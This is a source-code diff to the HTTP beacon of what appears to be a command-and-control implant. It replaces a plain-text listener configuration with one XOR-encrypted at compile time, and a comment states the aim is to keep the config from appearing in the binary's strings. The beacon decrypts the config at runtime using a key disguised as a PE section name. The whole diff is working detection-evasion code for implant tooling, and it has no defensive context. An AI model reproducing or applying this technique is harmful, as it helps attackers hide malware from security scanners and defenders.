@@ -18,9 +18,9 @@
 using namespace std;
 
 
-// TODO encypte with a beacon key
-std::string _BeaconHttpConfig_ = R"({
-    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
+// XOR encrypted at compile time, so don't appear in string
+// size of the config contained between () must be set in the compileTimeXOR template function
+constexpr std::string_view _BeaconHttpConfig_ = R"({
     "ListenerHttpConfig": [
         {
             "uri": [
@@ -112,6 +112,11 @@ std::string _BeaconHttpConfig_ = R"({
         }
     ]
 })";
+
+constexpr std::string_view keyConfig = ".CRT$XCL";
+
+// compile time encryption of http configuration
+constexpr std::array<char, 3564> _EncryptedBeaconHttpConfig_ = compileTimeXOR<3564, 8>(_BeaconHttpConfig_, keyConfig);
 
 
 #ifdef __linux__
@@ -415,15 +420,19 @@ BeaconHttp::BeaconHttp(std::string& ip, int port, bool isHttps)
 {
     srand(time(NULL));
 
-    m_beaconHttpConfig = nlohmann::json::parse(_BeaconHttpConfig_);
+    // decrypt HttpConfig
+    std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
+    std::string key(keyConfig);
+    XOR(configDecrypt, key);
 
-    const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    std::random_device rd;
-    std::mt19937 generator(rd());
-    std::uniform_int_distribution<int> distribution(0, charset.size() - 1);
+    m_beaconHttpConfig = nlohmann::json::parse(configDecrypt);
 
-    for(int i=0; i<_BeaconHttpConfig_.size(); i++)
-        _BeaconHttpConfig_[i]=charset[distribution(generator)];
+    // const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    // std::random_device rd;
+    // std::mt19937 generator(rd());
+    // std::uniform_int_distribution<int> distribution(0, charset.size() - 1);
+    // for(int i=0; i<_BeaconHttpConfig_.size(); i++)
+    //     _BeaconHttpConfig_[i]=charset[distribution(generator)];
 }
 
 
